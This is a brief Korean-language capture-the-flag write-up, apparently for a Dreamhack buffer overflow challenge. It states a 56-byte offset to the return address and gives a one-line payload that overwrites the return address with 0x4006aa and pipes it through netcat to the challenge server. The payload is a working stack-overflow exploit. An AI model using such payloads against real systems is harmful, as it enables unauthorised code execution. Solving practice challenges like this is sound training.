![alt text](image.png)

![alt text](image-1.png)

RET가 0x38=56 만큼 떨어져 있으므로.

```
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*56 + b'\xaa\x06\x40\x00\x00\x00\x00\x00')"; cat) | nc host3.dreamhack.games 20490
```

![alt text](image-2.png)